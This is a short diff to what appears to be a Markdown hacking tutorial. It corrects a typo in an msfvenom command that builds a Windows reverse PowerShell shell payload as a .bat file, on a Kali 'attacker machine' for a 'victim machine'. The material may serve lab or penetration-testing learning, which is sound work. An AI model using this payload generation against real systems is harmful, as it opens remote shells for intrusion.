@@ -48,7 +48,7 @@ Copy it to the **victim machine**.
 On your **attacker machine** (Kali), generate a reverse shell in `.bat` format:
 
 ```bash
-sfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=<Your_Port> -f raw > myshell.bat
+msfvenom -p cmd/windows/reverse_powershell LHOST=<Your_IP> LPORT=<Your_Port> -f raw > myshell.bat
 ```
 
 Replace `<Your_IP>` and `<Your_Port>` with your Kali IP and chosen port.
